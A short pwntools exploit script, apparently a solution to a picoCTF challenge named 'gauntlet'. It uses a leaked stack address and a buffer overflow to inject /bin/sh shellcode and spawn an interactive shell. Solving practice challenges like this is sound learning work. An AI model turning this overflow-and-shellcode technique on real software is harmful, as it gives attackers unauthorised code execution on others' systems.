from pwn import *
elf = ELF('/home/kali/Downloads/gauntlet')
p=elf.process()
context.arch = 'amd64'

cyberedu = 'wily-courier.picoctf.net:59013'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

dest = p.recvline()
dest = int(dest, 16)
p.sendline()

#we're going to write shellcode in dest.

shell = asm(shellcraft.sh())
print(len(shell)) #44
shell = shell.ljust(120, b'\x90')

#104 + 8(s) + 8(rbp) + dest

payload = shell
payload += p64(dest)
p.sendline(payload)
          
p.interactive()
